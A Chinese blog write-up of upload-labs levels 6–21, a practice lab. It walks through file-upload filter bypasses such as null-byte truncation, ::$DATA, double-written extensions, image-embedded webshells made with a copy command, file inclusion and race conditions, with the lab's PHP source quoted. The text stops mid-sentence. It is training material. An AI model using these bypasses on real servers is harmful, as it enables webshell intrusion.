<h2 id="upload-labs6"><a href="#upload-labs6" class="headerlink" title="upload-labs6"></a>upload-labs6</h2><p>在第六关中，发现他是没有对大小写进行过滤的<br>所以我们</p>
<p>在后缀做点手脚即可 然后抓包改回即可</p>
<h2 id="upload-labs7"><a href="#upload-labs7" class="headerlink" title="upload-labs7"></a>upload-labs7</h2><p>在第七关中没有去空，所以可以在后缀加个空格，然后抓包改回</p>
<h2 id="upload-labs8"><a href="#upload-labs8" class="headerlink" title="upload-labs8"></a>upload-labs8</h2><p>这关是在文件后加个. 在windows系统中，会自动把.给删除掉，所以可以先抓包加个.绕过过滤，然后文件上传到目录后，.会自动被删除</p>
<h2 id="upload-labs9"><a href="#upload-labs9" class="headerlink" title="upload-labs9"></a>upload-labs9</h2><p>在window的时候如果文件名+<code>&quot;::$DATA&quot;</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，他的目的就是不检查后缀名<br>然后我们点击上传图像后的文件，点击查看图像，删除后面的::$DATA即可<br>此时有个问题，为什么文件上传后，文件名变成随机数字了呢？<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210114192735.png" alt="img" style="zoom:67%;"><br>原因就在这<br>一开始猜测是有其他保护机制，查看源码 果然如此<br>但是修改后的文件名可以</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210105232428.png" alt="img"><br>使用burp 的go后 可以查找得到</p>
<h2 id="upload-labs10"><a href="#upload-labs10" class="headerlink" title="upload-labs10"></a>upload-labs10</h2><p>这一题和第五题的解题方法是一样的，但是注意到它的源码有些地方不太一样了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210114192146.png" alt="img" style="zoom:67%;"><br>就是他的路径变成是直接加file.name，感觉还是上一个保护机制更强一些，虽然用处也不大哈哈哈</p>
<h2 id="upload-labs11"><a href="#upload-labs11" class="headerlink" title="upload-labs11"></a>upload-labs11</h2><p>首先来分析一下源码<br>其中有一个<br><strong>str_ireplace()</strong></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210115165321.png" alt="img" style="zoom:67%;">
它的作用是这样的：将file_name中符合deny_ext格式的全部替换成空
而在上面 它是将两边的空格全部去掉，所以我们其实可以使用**双写**的方式进行绕过：
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210115165633.png" alt="img" style="zoom:67%;">
上传成功
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210115165852.png" alt="img" style="zoom:67%;">
并且可以成功显示
这就让人联想到sql绕过过滤了。

<p>为什么要采取替换为空的方式？<br>因为如果为空后缀 是不符合格式，直接就上传失败了</p>
<h2 id="upload-labs12"><a href="#upload-labs12" class="headerlink" title="upload-labs12"></a>upload-labs12</h2><h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><p><strong>基于白名单验证：只针对白名单中有的后缀名，文件才能上传成功。</strong></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210115171230.png" alt="img" style="zoom:67%;">

<p>前面 都是对于文件后缀名的过滤，首先是使用substr()和strrpos()截取后缀进行白名单匹配，这里没什么能操作的空间，再往下看，看到一个在img_path中 file_ext是可控的！<br>这里就要介绍一下</p>
<h4 id="截断上传"><a href="#截断上传" class="headerlink" title="截断上传"></a>截断上传</h4><p>前提条件：php 版本 &lt; 5.3.4且php的参数magic_quotes_gpc必须关闭</p>
<p>在url中<code>%00</code>表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束，而忽略后面上传的文件或图片，只上传截断前的文件或图片<br>一下为例子：</p>
<p>此时</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">path=<span class="string">&quot;upload/web/&quot;</span></span><br><span class="line">file=<span class="string">&quot;1.jpg&quot;</span></span><br></pre></td></tr></table></figure>

<p>此时如果我将路径改为，path=”upload/web/1.php%00”,那么拼接上去之后就变成”upload/web/1.php%001.jpg”，那么此时就相当于是上传的是1.php，而1.jpg的jpg被截断了，其实类似于mysql的注释符吧</p>
<p>注意下这里是get形式上传的</p>
<p>参考链接：<a href="https://bealright.github.io/2019/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94upload-labs(11-20)/">https://bealright.github.io/2019/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94upload-labs(11-20)/</a></p>
<h2 id="upload-labs13"><a href="#upload-labs13" class="headerlink" title="upload-labs13"></a>upload-labs13</h2><p>这一题和上一题没多大区别，依旧参数可控，不过上一题是get形式，而这题是POST<br>那么<strong>区别是什么呢？</strong>：<br>因为post不会像get对%00进行自动解码，所以需要用16进制进行解码<br>这里我们可以将burpsuit抓包以后将其发送至decoder，将php后的16进制码改为00即可<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210115190436.png" alt="img" style="zoom:67%;"><br>将20改为00即可<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210115190540.png" alt="img" style="zoom:67%;"><br>补充一张截图，这里的a只是为了说明空格的位置，空格其实也可以替换为其他的，因为我们后面会将这个位置的内容换成00，后面的内容均会被截断</p>
<h2 id="upload-labs14"><a href="#upload-labs14" class="headerlink" title="upload-labs14"></a>upload-labs14</h2><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210115192248.png" alt="img" style="zoom:67%;">
分析源码，fopen为什么后面使用的是rb？
“r”，即文本读取模式，应该使用“rb”模式，也就是二进制读取模式打开文件。
发现他只读两个字节
unpack：从二进制字符串对数据进行解包（用什么打包就用什么解包），加@的原因就是让其怎么都可以执行不报错和一句话木马的那个一个意思
而这里的unpack的意思是 将$bin中的以二进制的形式解包输出到chars中。
而下面这个intval是转化十进制的意思，将本来输出的二进制再转化为十进制，接下来通过这个进行对比
**我一直在想如果是直接解析文件内容，都没解析后缀，怎么知道是什么文件，答案是这样的**
其实,文件对自身文件内容,有着自己的文件头标识,我们只需要文件转为16进制,然后看各个文件类型对文件头的定义,就可以知道文件的类型了,例如,jpeg图片格式的文件头(2byte)标识为:0xff, 0xd8,结尾(2byte)标识为:0xff,0xd9 
而转化为二进制再转化为十进制也是一样的
https://blog.csdn.net/LiuBuZhuDeFanHua/article/details/82949144
这里是一些图片文件头以及解码

<p>查阅了一些资料以后发现：<br>数据通信(通过二进制格式与其它语言通信)<br>数据加密(如果不告诉第三方你的打包方式，对方解包的难度就相对很大)<br>节省空间(比如比较大的数字按字符串储存会浪费很多空间，打包成二进制格式才需要4位&lt;32位数字&gt;</p>
<p>解题：<br>因为他只读文本的前两个字节来判断是否为图片形式，我们先上传图片，看看图片的前两个字节是什么<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210116104816.png" alt="img" style="zoom:67%;"><br>是这样的，那我们创建一个图片马试试</p>
<p><a href="https://blog.csdn.net/ltysg0645/article/details/53996658">https://blog.csdn.net/ltysg0645/article/details/53996658</a><br>这是制作教程链接，这里采取的是使用cmd命令符窗口指令制作的方式<br>指令是： </p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">copy 1.png/b+1.php/a 12.png</span><br></pre></td></tr></table></figure>

<p>接下来上传文件<br>利用文件包含漏洞<br>在inlude.php界面，输入?file=路径+文件名<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210116122542.png" alt="img" style="zoom:67%;"></p>
<p>这样就是成功了</p>
<h4 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h4><p><a href="https://www.freebuf.com/articles/web/182280.html">https://www.freebuf.com/articles/web/182280.html</a><br>在这里已经讲得很清楚了，就不重复赘述了<br>这里用我的话讲就是：<br>1.在PHP中含有<br>require()<br>require_once()<br>include()<br>include_once() 这几个函数的时候，可以通过文件包含函数加载另一个文件中的PHP代码<br>然后我们再来分析一下源码<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210116130248.png" alt="img" style="zoom:67%;"></p>
<p>get一个file，如果这个file存在就输出file的内容（这边使用了<strong>include函数</strong>）<br>而这里为什么图片里的php代码能被解析呢？<br>原因是，在混合代码html+php的框架下，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>文件内包含这个的内容会被解析并输出结果，但是如果不是PHP内容的则会直接原样输出。</p>
<h5 id="拓展："><a href="#拓展：" class="headerlink" title="拓展："></a>拓展：</h5><h5 id="web服务器的pathinfo漏洞-文件解析漏洞"><a href="#web服务器的pathinfo漏洞-文件解析漏洞" class="headerlink" title="web服务器的pathinfo漏洞(文件解析漏洞)"></a>web服务器的pathinfo漏洞(文件解析漏洞)</h5><p>文件解析漏洞,是指Web容器（Apache、Nginx、IIS等）在解析文件时将文件解析成脚本文件格式并得以执行而产生的漏洞。从而,黑客可以利用该漏洞实现非法文件的解析。（PS:全称是Internet信息服务（baiInternet Information Service，IIS）。是微软提供的一个zhiWeb服务程序，在开发中称之为Web容器）</p>
<p>web容器：web容器是一种服务程序，在服务器一个端口就有一个提供相应服务的程序，而这个程序就是处理从客户端发出的请求，如tomcat、apache、nginx等。(可以理解为编程语言提供环境)</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210117130704.png" alt="img" style="zoom:67%;">
https://www.anquanke.com/post/id/219107#h2-14

<h2 id="upload-labs15"><a href="#upload-labs15" class="headerlink" title="upload-labs15"></a>upload-labs15</h2><p>查看源码，发现他这次使用了一个<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210117135338.png" alt="img" style="zoom:67%;"><br>getimagesize获取文件后缀类型<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210117135948.png" alt="img" style="zoom:67%;"><br>——来自菜鸟教程<br>他的每个后缀都对应一个编号，png对应的就是3<br>这个时候就在想，如果他有多个后缀呢？<br>这个时候我们需要知道getimagesize他读取文件针对的是文件内容，也就是他会对目标文件内容转化而为16进制再去进行一个读取，而根据前面我们可以知道，不同文件类型他的16进制是不同的，在这题当中，我测试了.php.png .png.php的后缀，只要这个文件的本质是图片形式的，他最后上传后显示出来的后缀即为.png（图片）格式后缀的，我们看源码，他最后保存的路径，文件名即为</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210117190807.png" alt="img" style="zoom:67%;">

<p>看上面这个图，他说是前面的十位随机数+.$res的后缀，而这个后缀，就是我们前面通过读取这个图片的十六进制内容所得到的。</p>
<p>所以这题，我们还是直接使用图片马的形式上传就行，因为图片马前面的内容刚好可以绕过过滤（还是图片）。<br>然后先点击查看图片，看看这个随机生成的文件名是什么<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210117193528.png" alt="img" style="zoom:67%;"><br>知道以后就直接利用文件包含漏洞打开即可</p>
<p><strong>PS：</strong>这里有个神奇的东西<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210117193500.png" alt="img" style="zoom:67%;"><br>在一堆乱码中居然有一个小星星，哇哦哈哈哈哈哈</p>
<h2 id="upload-labs16"><a href="#upload-labs16" class="headerlink" title="upload-labs16"></a>upload-labs16</h2><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210117194503.png" alt="img" style="zoom:67%;">
首先是exit_imagetupe()函数：
这个函数也是用来检查是否为图片类型的，函数读取一个图像的第一个字节并检查其签名，如果发现了恰当的签名则返回一个对应的常量，否则返回 FALSE。返回值和 getimagesize() 的值是一样的，但该函数要快得多。
所以说还是图片马的事情嘛~
上传图片马
成功，这里就不放截图了

<h2 id="upload-labs17"><a href="#upload-labs17" class="headerlink" title="upload-labs17"></a>upload-labs17</h2><p>还是依旧分析一下源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    $filename = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">     <span class="comment">//basename($...)获取文件名，如果是base($...,&quot;php&quot;)，获取无后缀的文件名</span></span><br><span class="line">    $target_path=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片，此处发挥功能的是imagecreatefromjpeg()函数，并且要让这个函数发挥作用，还需开启PHP组件中gd2</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="literal">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">   <span class="comment">//这里unlike删除原文件！！</span></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                <span class="comment">//这里unlike删除原文件！！</span></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">imagecreatefromgif()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像</span><br><span class="line">imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像</span><br><span class="line">imagecreatefrompng()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像</span><br><span class="line">imagecreatefromwbmp()：创建一块画布，并从 WBMP 文件或 URL 地址载入一副图像</span><br><span class="line">imagecreatefromstring()：创建一块画布，并从字符串中的图像流新建一副图像</span><br><span class="line">move_uploaded_file() 函数将上传的文件移动到新位置。</span><br></pre></td></tr></table></figure>

<p>有大神说：这里move_uploaded_file已经将图片马上传到服务器当中了，后面的二次渲染是不影响这个图片马的，所以说可以不管这个二次渲染，但是他后面有删除原文件的代码呀，最终上传到服务器的，也就只有二次渲染的文件，所以我也搞不懂为什么可以直接利用move_uploaded_file？原因就是他将第一个 @unlink($target_path); 给删除了</p>
<p>接下来我们就开始解题吧：<br>网上说gif的图比较好过 所以我们就照一张gif<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210118073218.png" alt="img" style="zoom:50%;"><br>对比我们的原图片，发现是这个位置的数据没有发生变化，所以我们就将木马插在这里，后面继续利用文件包含漏洞即可</p>
<h2 id="upload-labs18"><a href="#upload-labs18" class="headerlink" title="upload-labs18"></a>upload-labs18</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . $file_name;</span><br><span class="line">    <span class="comment">//in_array() 函数搜索数组中是否存在指定的值。</span></span><br><span class="line">    <span class="comment">//rename() 函数重命名文件或目录</span></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一关需要代码审计，那就让我们康康代码将文件上传到服务器，然后进行判断，是否存在白名单后缀，如果存在的话，就保留下来，反之就使用unlink删除这个文件。<br>这题考的是条件竞争</p>
<h4 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞:"></a>条件竞争漏洞:</h4><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p>
<p>所以解题方向就是，<strong>在上传以后储存在服务器，到检查不通过的这段时间如果我们可以利用起来，就算后续他将文件删除了也无所谓，那么这段时间太短了，如何将其放大？那就利用burp的intruder，随便弄一个peyload让他在那边跑就行，然后我们在浏览器中直接访问该文件</strong></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210118122944.png" alt="img" style="zoom:67%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210118122942.png" alt="img" style="zoom:67%;">
在观察文件再文件夹的状态时
![img](https://raw.githubusercontent.com/Hwwg/myphoto/master/20210118122943.png)
便发现他一直处于删除恢复的状态，此时需要注意的是，burp的线程需要设置得大一些。

<h4 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h4><h5 id="参数污染漏洞"><a href="#参数污染漏洞" class="headerlink" title="参数污染漏洞"></a>参数污染漏洞</h5><p>HTTP参数污染，也叫HPP（HTTP Parameter Pollution）。简单地讲就是给一个参数赋上两个或两个以上的值，由于现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理，而且不同的网站后端做出的处理方式是不同的，从而造成解析错误。<br><strong>即针对多个请求， 处理方式不同</strong><br>HPP漏洞的产生原因一方面来自服务器处理机制的不同，另一方面来自开发人员后端检测逻辑的问题。HTTP 参数污染的风险实际上取决于后端所执行的操作，以及被污染的参数提交到了哪里。总体上HPP一般有两种利用场景：<br> 1）逻辑漏洞，通常会造成IDOR，信息泄露，越权等漏洞;<br> 2）作为其他漏洞的辅助，用于绕过漏洞的检测和Waf等。<br>这个漏洞其实之前在sql-labs的时候就有遇到过了。<br>参考文章<a href="https://mp.weixin.qq.com/s?__biz=MzI3MTQyNzQxMA==&amp;mid=2247483892&amp;idx=1&amp;sn=bf1b7c8e6242a5b6c3ef2f6169df308b&amp;chksm=eac0b3c9ddb73adfac67da0512b172dbe0a4eda1fab4108646e9e3d714f9a72b927d259ed307&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzI3MTQyNzQxMA==&amp;mid=2247483892&amp;idx=1&amp;sn=bf1b7c8e6242a5b6c3ef2f6169df308b&amp;chksm=eac0b3c9ddb73adfac67da0512b172dbe0a4eda1fab4108646e9e3d714f9a72b927d259ed307&amp;scene=21#wechat_redirect</a></p>
<h2 id="upload-labs19"><a href="#upload-labs19" class="headerlink" title="upload-labs19"></a>upload-labs19</h2><p>这一关他让我们代码审计，发现</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$ret = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">  <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>本关对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功</p>
<h2 id="upload-labs20"><a href="#upload-labs20" class="headerlink" title="upload-labs20"></a>upload-labs20</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"> <span class="comment">//pathinfo将文件信息以数组的形式返回，这里返回的是后缀</span></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析源码：他是这样的，比对黑名单，如果后缀和黑名单里的不一样，那么就禁止保存，如果一样，则将文件名保存为上传时的文件的文件名（这是有分步骤的）。<br>这里就需要用到我们之前看过的move_uploaded_file()截断漏洞<br>思路：<br>上传一个jpg文件，内容为php代码，再上传过程中，由于最后保存的文件名我们可控，根据漏洞，将.jpg截断<br>即：</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210119215331.png" alt="img" style="zoom:67%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210119215411.png" alt="img" style="zoom:67%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210119215032.png" alt="img" style="zoom:67%;">

<h2 id="upload-labs21"><a href="#upload-labs21" class="headerlink" title="upload-labs21"></a>upload-labs21</h2><p>在这一关中需要代码审计<br>可以看到后面</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">           $msg = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           $file_name = reset($file) . <span class="string">&#x27;.&#x27;</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">           $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">           $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">           <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">               $msg = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">               $is_upload = <span class="literal">true</span>;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               $msg = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>前面的过滤绕过似乎都没有多大意义，毕竟后面还有白名单，但是这个判断条件就很奇怪，如果不是数组类型，则执行此判断，反之就不执行了？？？？那我们就将文件定名变成数组怎么弄呢？先往下看，他文件的命名也很有趣<br>1.reset()函数：指向数组中的第一个元素<br>2.count()返回数组中元素的个数<br>3.end()最后一个元素的值<br>4.explode() 函数使用一个字符串分割另一个字符串，并返回由字符串组成的数组。<br>接下来让我们逐个破解：<br>它先将file分割成一个个数组，假设为1.php<br>那么数组为file[0]=1 file[1]=php<br>为了绕过白名单限制，我们可以命名为1.php.jpg<br>接下来是.php最为后缀，1作为前缀变成新文件的文件名  这样好像可行？？<br>试试，不行诶，<br>再来思考一下：<br>1.count()返回数组中元素的个数 而数组从0开始，说明3-1返回的还是后缀，也就是一开始的jpg，这也就说明了为什么最后重新拼接过后的文件名不是我们设想中的123.php<br>那么该如何解决这个麻烦呢？<br>看到move_uploaded_file，使用/.截断试试，或者00截断<br>但是这个时候我们需要让他构造完后变成123.php/.jpg才会起到截断作用，但是我们知道有.就会被分割成数组，这时又该如何呢？<br>再代码以上看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$file = <span class="keyword">empty</span>($_POST[<span class="string">&#x27;save_name&#x27;</span>]) ? $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : $_POST[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">       <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">           $file = explode(<span class="string">&#x27;.&#x27;</span>, strtolower($file));</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>结合burpsuit<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210119232717.png" alt="img" style="zoom:67%;"><br>推测现在的file名字为这个save_name的值，如果我们直接 更改这个save_name为一个数组，那么file也会变成一个数组，这样就不会经过被分割的那个数组，处理恰当，也不会经过白名单，看来是不行，因为他选取的是file这个数组的最后一个元素并将其值直接赋值给ext，故这里的ext不可能再是一个数组，所以，数组最后的元素一定是jpg</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210119234308.png" alt="img" style="zoom:67%;">
但是还是不行？没有报错但却无事发生？？？说明上面是错的
再次调整，将0和1数组调换位置发现报错信息改变了，（这里说明数组要从大到小）变成是文件上传失败
这里尝试了几种组合方式得出：
